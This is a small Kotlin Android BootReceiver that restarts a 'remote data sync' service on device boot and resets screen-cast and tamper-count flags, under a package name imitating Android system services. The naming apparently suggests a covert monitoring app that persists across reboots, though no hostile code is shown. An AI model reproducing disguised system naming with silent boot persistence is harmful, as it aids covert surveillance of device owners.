package com.android.services.receiver

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.android.services.util.AppConstants
import com.android.services.util.FirebasePushUtils

class BootReceiver : BroadcastReceiver() {

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    override fun onReceive(context: Context, intent: Intent) {
        FirebasePushUtils.restartRemoteDataSyncService(context)
        AppConstants.isMyAppScreenCastPermission=false
        AppConstants.tamperCount = null
    }
}